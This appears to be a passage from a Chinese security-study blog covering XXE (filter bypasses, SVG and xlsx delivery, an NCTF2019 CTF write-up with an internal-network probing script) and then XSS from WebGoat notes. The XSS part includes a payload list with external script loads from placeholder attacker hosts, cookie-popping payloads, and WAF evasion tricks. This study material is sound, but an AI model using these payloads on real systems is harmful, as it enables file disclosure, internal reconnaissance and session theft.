class="name">foo</span>&gt;</span></span><br></pre></td></tr></table></figure><p>如果 XML 解析器尝试使用&#x2F;dev&#x2F;random文件中的内容来替代实体，则此示例会使服务器（使用 UNIX 系统）崩溃。</p><h2 id="绕过XXE防护"><a href="#绕过XXE防护" class="headerlink" title="绕过XXE防护"></a>绕过XXE防护</h2><p>编码绕过：<code>ENTITY</code> <code>SYSTEM</code> <code>file</code> 等关键词被过滤，使用编码方式绕过：UTF-16BE：<code>cat payload.xml | iconv -f utf-8 -t utf-16be &gt; payload.8-16be.xml</code><br>协议绕过：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">file://协议加文件上传</span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">test</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % a <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///var/www/uploads/cfcd208495d565ef66e7dff9f98764da.jpg&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    %a;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="comment">&lt;!--上传文件--&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % b <span class="keyword">SYSTEM</span> <span class="string">&#x27;http://118.25.14.40:8200/hack.dtd&#x27;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">php://filter协议加文件上传</span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">test</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % a <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/resource=/var/www/uploads/cfcd208495d565ef66e7dff9f98764da.jpg&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    %a;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">test</span>&gt;</span></span><br><span class="line">        <span class="symbol">&amp;hhh;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--上传文件--&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY <span class="keyword">hhh</span> <span class="keyword">SYSTEM</span> <span class="string">&#x27;php://filter/read=convert.base64-encode/resource=./flag.php&#x27;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">test</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % a <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/read=convert.base64-decode/resource=/var/www/uploads/cfcd208495d565ef66e7dff9f98764da.jpg&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    %a;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">test</span>&gt;</span></span><br><span class="line">        <span class="symbol">&amp;hhh;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--上传文件--&gt;</span></span><br><span class="line">PCFFTlRJVFkgaGhoIFNZU1RFTSAncGhwOi8vZmlsdGVyL3JlYWQ9Y29udmVydC5iYXNlNjQtZW5jb2RlL3Jlc291cmNlPS4vZmxhZy5waHAnPg==</span><br></pre></td></tr></table></figure><h2 id="利用场景"><a href="#利用场景" class="headerlink" title="利用场景"></a>利用场景</h2><p>svg</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">note</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///proc/self/cwd/flag.txt&quot;</span> &gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">height</span>=<span class="string">&quot;100&quot;</span> <span class="attr">width</span>=<span class="string">&quot;1000&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">text</span> <span class="attr">x</span>=<span class="string">&quot;10&quot;</span> <span class="attr">y</span>=<span class="string">&quot;20&quot;</span>&gt;</span><span class="symbol">&amp;file;</span><span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure><p>从当前文件夹读取文件可以使用&#x2F;proc&#x2F;self&#x2F;cwd</p><p>excel<br>首先用excel创建一个空白的xlsx，然后解压</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir XXE &amp;&amp; cd XXE</span><br><span class="line">unzip ../XXE.xlsx</span><br></pre></td></tr></table></figure><p>将<code>[Content_Types].xml</code>改成恶意xml，再压缩回去<code>zip -r ../poc.xlsx *</code></p><h2 id="CTF题目"><a href="#CTF题目" class="headerlink" title="CTF题目"></a>CTF题目</h2><h3 id="NCTF2019-True-XML-cookbook"><a href="#NCTF2019-True-XML-cookbook" class="headerlink" title="NCTF2019 True XML cookbook"></a>NCTF2019 True XML cookbook</h3><p>访问页面并抓包<br><img src="/2024/09/24/WebSecurity/owasptop/xmlexternalentity/image-2.png"><br>发现请求是xml格式的，首先构造payload尝试读取flag：<code>&lt;!ENTITY abc SYSTEM &quot;file:///flag&quot;&gt;</code>，失败，刚开始没打分号，xml有报错，发现文件路径在<code>/var/www/html/doLogin.php</code>，后面还是不行，可能是没有。尝试用php协议，<code> &lt;!ENTITY abc SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/var/www/html/doLogin.php&quot;&gt;</code><br><img src="/2024/09/24/WebSecurity/owasptop/xmlexternalentity/image-3.png"><br>解码后成功获得源代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* autor: c0ny1</span></span><br><span class="line"><span class="comment">* date: 2018-2-7</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$USERNAME</span> = <span class="string">&#x27;admin&#x27;</span>; <span class="comment">//账号</span></span><br><span class="line"><span class="variable">$PASSWORD</span> = <span class="string">&#x27;024b87931a03f738fff6693ce0a78c88&#x27;</span>; <span class="comment">//密码</span></span><br><span class="line"><span class="variable">$result</span> = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line"><span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line"><span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line"><span class="variable">$creds</span> = <span class="title function_ invoke__">simplexml_import_dom</span>(<span class="variable">$dom</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$creds</span>-&gt;username;</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$creds</span>-&gt;password;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$username</span> == <span class="variable">$USERNAME</span> &amp;&amp; <span class="variable">$password</span> == <span class="variable">$PASSWORD</span>)&#123;</span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="number">1</span>,<span class="variable">$username</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="number">0</span>,<span class="variable">$username</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>)&#123;</span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="number">3</span>,<span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type: text/html; charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>看上去是正常的来者，也没有提示有其他的方向或思路，尝试继续用上面的协议读取一些其他文件，尝试进行内网探测<br><img src="/2024/09/24/WebSecurity/owasptop/xmlexternalentity/image-4.png"><br><img src="/2024/09/24/WebSecurity/owasptop/xmlexternalentity/image-5.png"><br>发现有一个奇怪的ip，尝试访问下<br><img src="/2024/09/24/WebSecurity/owasptop/xmlexternalentity/image-6.png"><br>有报错，尝试爆破下，失败了，看网上解析还需要查看其他的文件<code>file:///proc/net/fib_trie</code>。文件提供了关于FIB（Forwarding Information Base，转发信息库）Trie（前缀树）的信息。其作用是高效地存储和查找路由表项。它以一种前缀树的形式组织了路由表项，其中每个节点表示一个路由前缀。通过在树中进行前缀匹配，内核可以快速找到与目标IP地址最匹配的路由表项。<br><img src="/2024/09/24/WebSecurity/owasptop/xmlexternalentity/image-7.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> res</span><br><span class="line">url=<span class="string">&quot;http://b32f52cd-49a3-48fa-9f8f-da51aeed0e6d.node5.buuoj.cn:81/doLogin.php&quot;</span></span><br><span class="line">rawPayload=<span class="string">&#x27;&lt;?xml version=&quot;1.0&quot;?&gt;&#x27;</span>\</span><br><span class="line">         <span class="string">&#x27;&lt;!DOCTYPE user [&#x27;</span>\</span><br><span class="line">         <span class="string">&#x27;&lt;!ENTITY payload1 SYSTEM &quot;http://10.244.166.&#123;&#125;&quot;&gt;&#x27;</span>\</span><br><span class="line">         <span class="string">&#x27;]&gt;&#x27;</span>\</span><br><span class="line">         <span class="string">&#x27;&lt;user&gt;&#x27;</span>\</span><br><span class="line">         <span class="string">&#x27;&lt;username&gt;&#x27;</span>\</span><br><span class="line">         <span class="string">&#x27;&amp;payload1;&#x27;</span>\</span><br><span class="line">         <span class="string">&#x27;&lt;/username&gt;&#x27;</span>\</span><br><span class="line">         <span class="string">&#x27;&lt;password&gt;&#x27;</span>\</span><br><span class="line">         <span class="string">&#x27;23&#x27;</span>\</span><br><span class="line">         <span class="string">&#x27;&lt;/password&gt;&#x27;</span>\</span><br><span class="line">         <span class="string">&#x27;&lt;/user&gt;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">256</span>):</span><br><span class="line">    payload=rawPayload.<span class="built_in">format</span>(i)</span><br><span class="line">    <span class="comment">#payload=rawPayload</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">str</span>(<span class="string">&quot;#&#123;&#125; =&gt;&quot;</span>).<span class="built_in">format</span>(i),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        resp=res.post(url,data=payload,timeout=<span class="number">0.3</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(resp.text,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>用脚本爆破出</p><h2 id="CVE-2021-29447"><a href="#CVE-2021-29447" class="headerlink" title="CVE-2021-29447"></a>CVE-2021-29447</h2><p><a href="https://www.freebuf.com/vuls/272446.html">https://www.freebuf.com/vuls/272446.html</a></p>]]></content>
      
      
      <categories>
          
          <category> Web Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XXE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【Web安全】XSS跨站脚本攻击</title>
      <link href="/2024/09/20/WebSecurity/owasptop/crosssitescripting/"/>
      <url>/2024/09/20/WebSecurity/owasptop/crosssitescripting/</url>
      
        <content type="html"><![CDATA[<p>这个笔记基础内容是基于WebGoat靶场撰写的<br>Cross Site Scripting (XSS) <a href="https://owasp.org/www-community/attacks/xss/">https://owasp.org/www-community/attacks/xss/</a><br>XSS Filter Evasion Cheat Sheet ：<a href="https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html">https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html</a><br>干货笔记！一文讲透XSS(跨站脚本)漏洞 <a href="https://cloud.tencent.com/developer/article/1969009">https://cloud.tencent.com/developer/article/1969009</a><br>他山之石 | 对 XSS 的一次深入分析认识 <a href="https://www.freebuf.com/articles/web/195507.html">https://www.freebuf.com/articles/web/195507.html</a><br>超全的xss绕过技巧 <a href="https://segmentfault.com/a/1190000044942572">https://segmentfault.com/a/1190000044942572</a><br>前端安全系列（一）：如何防止XSS攻击？ <a href="https://segmentfault.com/a/1190000016551188">https://segmentfault.com/a/1190000016551188</a></p><p>相关论文：</p><ul><li>Dancer in the Dark: Synthesizing and Evaluating Polyglots for Blind Cross-Site Scripting</li><li>Link: Black-Box Detection of Cross-Site Scripting Vulnerabilities Using Reinforcement Learning</li><li>Don’t Trust The Locals: Investigating the Prevalence of Persistent Client-Side Cross-Site Scripting in the Wild</li></ul><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>最基础的验证语句<code>&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;</code>，</p><p>XSS最常出现的地方：</p><ul><li>Search fields that echo a search string back to the user（将搜索字符串回显给用户的搜索字段）</li><li>Input fields that echo user data（回显用户数据的输入字段）</li><li>Error messages that return user-supplied text（返回用户输入文本的错误消息）</li><li>Hidden fields that contain user-supplied data（包含用户数据的隐藏字段）</li><li>Any page that displays user-supplied data（显示用户数据的任何页面）<ul><li>Message boards（留言板）</li><li>Free form comments（自由形式评论）</li></ul></li><li>HTTP Headers（HTTP头部）</li></ul><p>XSS攻击可能会导致：</p><ul><li>Stealing session cookies 窃取会话cookie</li><li>Creating false requests 创建虚假请求</li><li>Creating false fields on a page to collect credentials 在页面上创建用于收集凭据的虚假字段</li><li>Redirecting your page to a “non-friendly” site 将您的页面重定向到“不友好”的网站</li><li>Creating requests that masquerade as a valid user 创建伪装成有效用户的请求</li><li>Stealing of confidential information 窃取机密信息</li><li>Execution of malicious code on an end-user system (active scripting) 在最终用户系统上执行恶意代码（主动脚本）</li><li>Insertion of hostile and inappropriate content 插入敌对和不适当的内容</li></ul><p>XSS攻击类型：<br>反射型（Reflected）</p><ul><li>用户请求中的恶意内容通过Web浏览器显示给用户</li><li>服务器响应后，恶意内容被写入页面</li><li>需要社交工程学技巧</li><li>以用户在浏览器中继承的浏览器权限运行<br><img src="/2024/09/20/WebSecurity/owasptop/crosssitescripting/image.png"></li></ul><p>DOM-based（技术上也属于反射型）</p><ul><li>客户端脚本使用用户请求中的恶意内容将HTML写入其页面</li><li>类似于反射型XSS</li><li>以用户在浏览器中继承的浏览器权限运行</li></ul><p>存储型（Stored or persistent）</p><ul><li>恶意内容存储在服务器上（数据库、文件系统或其他对象），稍后显示给用户的Web浏览器</li><li>不需要社交工程学技巧</li></ul><p>除此之外还有下面这些xss类别：<br>mXSS：mXSS中文是突变型XSS，指的是原先的Payload提交是无害不会产生XSS，而由于一些特殊原因，如反编码等，导致Payload发生变异，导致的XSS。 <a href="https://www.freebuf.com/articles/network/409092.html">https://www.freebuf.com/articles/network/409092.html</a><br>UXSS：是一种利用浏览器或者浏览器扩展漏洞来制造产生XSS的条件并执行代码的一种攻击类型。UXSS 可以理解为Bypass 同源策略。</p><h2 id="XSS的攻击载荷"><a href="#XSS的攻击载荷" class="headerlink" title="XSS的攻击载荷"></a>XSS的攻击载荷</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=http://xxx.com/xss.js&gt;&lt;/script&gt;  #引用外部的xss</span><br><span class="line">&lt;script&gt; alert(&quot;hack&quot;)&lt;/script&gt;   #弹出hack</span><br><span class="line">&lt;script&gt;alert(document.cookie)&lt;/script&gt; #弹出cookie</span><br><span class="line"></span><br><span class="line">&lt;img  src=1  onerror=alert(&quot;hack&quot;)&gt;</span><br><span class="line">&lt;img  src=1  onerror=alert(/hack/)&gt;</span><br><span class="line">&lt;img  src=1  onerror=alert(document.cookie)&gt;  #弹出cookie</span><br><span class="line">&lt;img  src=1  onerror=alert(123)&gt;      注：对于数字，可以不用引号</span><br><span class="line">&lt;img  src=&quot;javascript:alert(&quot;XSS&quot;);&quot;&gt;</span><br><span class="line">&lt;img  dynsrc=&quot;javascript:alert(&#x27;XSS&#x27;)&quot;&gt;</span><br><span class="line">&lt;img  lowsrc=&quot;javascript:alert(&#x27;XSS&#x27;)&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;body onload=alert(&quot;XSS&quot;)&gt;</span><br><span class="line">&lt;body background=&quot;javascript:alert(&quot;XSS&quot;)&quot;&gt;</span><br><span class="line"></span><br><span class="line">// 由于浏览器的内容安全策略（CSP），iFrame中的JavaScript无法访问父页面的DOM</span><br><span class="line">&lt;iframe src=”http://evil.com/xss.html”&gt;</span><br><span class="line"></span><br><span class="line">// 在某些浏览器中，如果标记的type属性&lt;input&gt;设置为image，则可以对其进行操作以嵌入脚本</span><br><span class="line">&lt;input type=&quot;image&quot; src=&quot;javascript:alert(&#x27;XSS&#x27;);&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;link rel=&quot;stylesheet&quot; href=&quot;javascript:alert(&#x27;XSS&#x27;);&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;table background=&quot;javascript:alert(&#x27;XSS&#x27;)&quot;&gt;</span><br><span class="line">&lt;td background=&quot;javascript:alert(&#x27;XSS&#x27;)&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;div style=&quot;background-image: url(javascript:alert(&#x27;XSS&#x27;))&quot;&gt;</span><br><span class="line">&lt;div style=&quot;width: expression(alert(&#x27;XSS&#x27;));&quot;&gt;</span><br><span class="line"></span><br><span class="line">// 该&lt;object&gt;标签可用于从外部站点脚本包含</span><br><span class="line">&lt;object type=&quot;text/x-scriptlet&quot; data=&quot;http://hacker.com/xss.html&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;style onload=alert(1) /&gt;</span><br><span class="line"></span><br><span class="line">// Marquee 标签除了在web开发中有标签内容回滚作用之外，它还支持一系列的事件处理程序，因此可以用它来实现XSS Payload触发。</span><br><span class="line">&lt;marquee behavior=&quot;alternate&quot; onstart=alert(1)&gt;hack the planet&lt;/marquee&gt;</span><br><span class="line">&lt;marquee loop=&quot;1&quot; onfinish=alert(1)&gt;hack the planet&lt;/marquee&gt;</span><br><span class="line">&lt;marquee onstart=alert(1)&gt;hack the planet&lt;/marquee&gt;</span><br><span class="line"></span><br><span class="line">// media标签</span><br><span class="line">&lt;audio oncanplay=alert(1) src=&quot;/media/hack-the-planet.mp3&quot; /&gt;  // 在用户可以开始播放音视频（audio/video）时触发；</span><br><span class="line">&lt;audio ondurationchange=alert(1) src=&quot;/media/hack-the-planet.mp3&quot; /&gt;  // 在音视频（audio/video）的时长发生变化时触发；</span><br><span class="line">&lt;audio autoplay=true onended=alert(1) src=&quot;/media/hack-the-planet.mp3&quot; /&gt;</span><br><span class="line">&lt;audio onloadeddata=alert(1) src=&quot;/media/hack-the-planet.mp3&quot; /&gt;</span><br><span class="line">&lt;audio onloadedmetadata=alert(1) src=&quot;/media/hack-the-planet.mp3&quot; /&gt;</span><br><span class="line">&lt;audio onloadstart=alert(1) src=&quot;/media/hack-the-planet.mp3&quot; /&gt;</span><br><span class="line">&lt;audio onprogress=alert(1) src=&quot;/media/hack-the-planet.mp3&quot; /&gt;</span><br><span class="line">&lt;audio onsuspend=alert(1) src=&quot;/media/hack-the-planet.mp3&quot; /&gt;</span><br><span class="line">&lt;video oncanplay=alert(1) src=&quot;/media/hack-the-planet.mp4&quot; /&gt;</span><br><span class="line">&lt;video ondurationchange=alert(1) src=&quot;/media/hack-the-planet.mp4&quot; /&gt;</span><br><span class="line">&lt;video autoplay=true onended=alert(1) src=&quot;/media/hack-the-planet.mp4&quot; /&gt;</span><br><span class="line">&lt;video onloadeddata=alert(1) src=&quot;/media/hack-the-planet.mp4&quot; /&gt;</span><br><span class="line">&lt;video onloadedmetadata=alert(1) src=&quot;/media/hack-the-planet.mp4&quot; /&gt;</span><br><span class="line">&lt;video onloadstart=alert(1) src=&quot;/media/hack-the-planet.mp4&quot; /&gt;</span><br><span class="line">&lt;video onprogress=alert(1) src=&quot;/media/hack-the-planet.mp4&quot; /&gt;</span><br><span class="line">&lt;video onsuspend=alert(1) src=&quot;/media/hack-the-planet.mp4&quot; /&gt;</span><br></pre></td></tr></table></figure><h2 id="XSS-绕过技巧"><a href="#XSS-绕过技巧" class="headerlink" title="XSS 绕过技巧"></a>XSS 绕过技巧</h2><h3 id="Eval-其它冗余符号"><a href="#Eval-其它冗余符号" class="headerlink" title="Eval &amp; 其它冗余符号"></a>Eval &amp; 其它冗余符号</h3><p>如果目标系统的WAF或其它防护软件没把 <code>/(eval|replace)\(.+?\)/i</code> 这种样式列入黑名单，那么我们可以在其中通过夹杂冗余符号的方式形成Payload，利用其中的eval动作来加载Payload，再利用之后的replace动作把冗余符号进行替换删除。<br><code>eval(&#39;~a~le~rt~~(~~1~~)~&#39;.replace(/~/g, &#39;&#39;))</code><br>当引号被转义（escape）之后，不管使用了什么绕过技术，肯定会引起问题，就像上面的<code>eval(&#39;~a~le~rt~~(~~1~~)~&#39;.replace(/~/g, &#39;&#39;))</code>一样，如果要顺带把引号转义，其Payload可能如下：<br><code>eval(\&#39;~a~le~rt~~(~~1~~)~\&#39;.replace(/~/g, \&#39;\&#39;))</code><br>但另一种变换方法就是利用正则表达式来避免带入引号的使用，如可以在上述Payload中引入正斜杠方式，然后再用创建的正则表达式对象属性来访问其中的闭合字符串。示例如下：<br><code>eval(/~a~le~rt~~(~~1~~)~/.source.replace(/~/g, new String()))</code><br>以此用new String()来实现把~转换为空字符串的目的，从而不需要用到引号。<br>对引号实行转义并绕过WAF类产品模式匹配规则的一个有效手段是使用eval的String.fromCharCode方法，该方法将获取一个或多个十进制Unicode值，然后将它们转换成等效的ASCII字符，并将它们连成一个字符串，如：<br><code>console.log(String.fromCharCode(65,66,67,68))  //在终端返回显示的是字符串 &quot;ABCD&quot;</code><br>通过这种对Unicode值的转换，可以把目标值传递给eval，因此，可以构造Payload如下：<br><code>eval(String.fromCharCode(97,108,101,114,116,40,49,41))  //// 最终执行的会是 alert(1)</code></p><p>我们也可以采取其它方法来规避过滤。由于函数可以存储在JavaScript的变量中，所以为了不直接调用eval，我们可以把它分配给一个变量，然后间接调用它，示例如下：<br><code>var x = eval; x(&#39;alert(1)&#39;)</code><br>另外一种间接调用eval的方法是用括号进行构造，即用括号间接调用法，如表达式(1,2,3,4)返回的是4，即括号中最后一个，所以(1,eval)返回的是函数eval，具体示例如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(eval)    // 返回函数eval</span><br><span class="line">(1, eval) // 仍然返回函数eval</span><br></pre></td></tr></table></figure><p>因此可以构造以下Payload来执行：<code>(1, eval)(&#39;alert(1)&#39;)  // 返回 alert(1)</code><br>基于此，也可以使用call方法来直接调用，如下：<code>eval.call(null, &#39;alert(1)&#39;)  //返回 alert(1)</code><br>其次，可以定义一个新函数的方法来规避直接对eval的调用，当然这种方法还会涉及到一些语法定义，如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function hackThePlanet () &#123;</span><br><span class="line"></span><br><span class="line">  alert(1)</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后，还可以用创建Function对象的方式来实现alert调用，该对象接受构造函数中的字符串作为函数实现，如下：<code>new Function(&#39;alert(1)&#39;)()</code></p><h3 id="利用错误输入过滤机制实现绕过"><a href="#利用错误输入过滤机制实现绕过" class="headerlink" title="利用错误输入过滤机制实现绕过"></a>利用错误输入过滤机制实现绕过</h3><p>删除机制：<br>也可能会删的不干净，如下是常见的绕过方式：<code>&lt;sc&lt;script&gt;ript&gt;alert(1)&lt;/sc&lt;/script&gt;ript&gt;</code><br>上述javascript中，如果过滤器只是简单地把<code>&lt;script&gt;</code>和 <code>&lt;/script&gt;</code> 标签对删除了，那么最终会剩下：<code>&lt;script&gt;alert(1)&lt;/script&gt;</code><br>同样的方法可以应用到一些标签属性或事件处理程序中，就像如果onerror是删除目标，那么，我们可以构造以下Payload：<code>&lt;img src=x ononerrorerror=alert(1) 